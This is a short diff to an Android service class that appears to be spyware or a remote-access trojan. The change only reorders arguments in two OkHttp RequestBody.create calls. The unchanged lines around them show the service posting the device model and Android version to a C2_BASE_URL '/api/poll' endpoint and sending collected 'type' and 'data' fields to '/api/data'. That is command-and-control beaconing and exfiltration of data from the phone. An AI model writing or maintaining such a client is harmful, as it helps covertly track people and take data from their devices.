@@ -64,7 +64,7 @@ public class MainService extends Service {
             json.put("model", Build.MODEL);
             json.put("android", Build.VERSION.RELEASE);
 
-            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
+            RequestBody body = RequestBody.create(MediaType.parse("application/json"), json.toString());
             Request request = new Request.Builder()
                     .url(C2_BASE_URL + "/api/poll")
                     .post(body)
@@ -106,7 +106,7 @@ public class MainService extends Service {
             json.put("type", type);
             json.put("data", data);
 
-            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
+            RequestBody body = RequestBody.create(MediaType.parse("application/json"), json.toString());
             Request request = new Request.Builder()
                     .url(C2_BASE_URL + "/api/data")
                     .post(body)
